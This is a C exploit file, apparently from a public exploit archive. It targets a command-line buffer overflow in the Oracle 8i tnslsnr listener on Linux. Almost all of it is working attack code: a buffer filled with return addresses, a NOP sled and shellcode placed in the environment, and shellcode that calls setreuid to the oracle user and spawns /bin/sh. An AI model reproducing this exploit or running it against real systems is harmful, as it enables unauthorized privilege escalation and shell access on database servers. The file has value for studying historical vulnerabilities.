/*
source: http://www.securityfocus.com/bid/4413/info

Oracle 8i is a powerful relational database product. It is available for Windows, Linux, and a wide range of Unix operating systems.

A vulnerability has been reported with some versions of Oracle 8i for Linux. A local attacker able to execute the tnslsnr process may pass an oversized command line parameter and cause a buffer overflow, possibly leading to the execution of arbitrary code as the user 'oracle'.

Versions of Oracle 8i available for other operating systems have not yet been confirmed as vulnerable. 
*/

/*
 * Yet another exploit for the 'Unbreakable' Oracle database
 * The vulnerability was found by KF / Snosoft (http://www.snosoft.com)
 * Shellcode created by r0z / Promisc
 * Exploit coded up by The Itch / Promisc (http://www.promisc.org)
 *
 * This exploit was developed on the Snosoft vulnerability research machines
 * mail dotslash@snosoft.com if you wish to participate in vuln research. 
 *
 * - The Itch
 * - itchie@promisc.org
 *
 * - Technical details concerning the exploit -
 *
 * 1). Buffer overflow occurs after writing more then 2132 bytes into the
 *     buffer at the command line 2128 to overwrite ebp, 2132 to
 *     overwrite eip).
 * 2). If you write more then 2132 bytes, other frames will be
 *     overwritten afterwards and will mess up your flow of arbitrary code
 *     execution. (It must be exactly 2132 bytes!)
 * 3). shellcode will try to do a setreuid(515);
 */

#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_EGG_SIZE 4096
#define NOP 0x90

/* 2132 + 1 for the \0 at the end of the string */
#define DEFAULT_BUFFER_SIZE 2133


/* Shellcode made by r0z (r0z@promisc.org) */
char shellcode[] =
         "\x31\xdb"              /* xor   %ebx, %ebx     */
         "\x31\xc9"              /* xor   %ecx, %ecx     */
         "\xf7\xe3"              /* mul   %ebx           */
         "\xb0\x46"              /* mov   $0x46, %al     */
         "\x66\xbb\x03\x02"      /* mov   $0x1fc, %bx    */
         "\x49"                  /* dec   %ecx           */
         "\xcd\x80"              /* int   $0x80          */
         "\x31\xd2"              /* xor   %edx, %edx     */
         "\x52"                  /* push  %edx           */
         "\x68\x6e\x2f\x73\x68"  /* push  $0x68732f6e    */
         "\x68\x2f\x2f\x62\x69"  /* push  $0x69622f2f    */
         "\x89\xe3"              /* mov   %esp, %ebx     */
         "\x52"                  /* push  %edx           */
         "\x53"                  /* push  %ebx           */
         "\x89\xe1"              /* mov   %esp, %ecx     */
         "\x6a\x0b"              /* pushl $0xb           */
         "\x58"                  /* pop   %eax           */
         "\xcd\x80";             /* int   $0x80          */

int main(int argc, char *argv[])
{
        char *buff;
        char *egg;
        char *ptr;
        long *addr_ptr;
        long addr;
        int bsize = DEFAULT_BUFFER_SIZE;
        int eggsize = DEFAULT_EGG_SIZE;
        int i;
        int get_sp = (int)&get_sp;

        if(argc > 1) { bsize = atoi(argv[1]); }

        if(!(buff = malloc(bsize)))
        {
                printf("unable to allocate memory for %d bytes\n", bsize);
                exit(1);
        }

        if(!(egg = malloc(eggsize)))
        {
                printf("unable to allocate memory for %d bytes\n", eggsize);
                exit(1);
        }

        printf("Oracle tnslsrn 8.1.5\n");
        printf("Vulnerability found by KF / http://www.snosoft.com\n");
        printf("Coded by The Itch / http://www.promisc.org\n\n");
        printf("Using return address: 0x%x\n", get_sp);
        printf("Using buffersize    : %d\n", bsize - 1);

        ptr = buff;
        addr_ptr = (long *) ptr;
        for(i = 0; i < bsize; i+=4) { *(addr_ptr++) = get_sp; }

        ptr = egg;
        for(i = 0; i < eggsize - strlen(shellcode)-1; i++)
        {
                *(ptr++) = NOP;
        }

        for(i = 0; i < strlen(shellcode); i++)
        {
                *(ptr++) = shellcode[i];
        }

        egg[eggsize - 1] = '\0';
        memcpy(egg, "EGG=", 4);
        putenv(egg);
        buff[bsize - 1 ]= '\0';
        execl("/home/u01/app/oracle/product/8.1.5/bin/tnslsnr",
              "tnslsnr", buff, 0);
        return 0;
}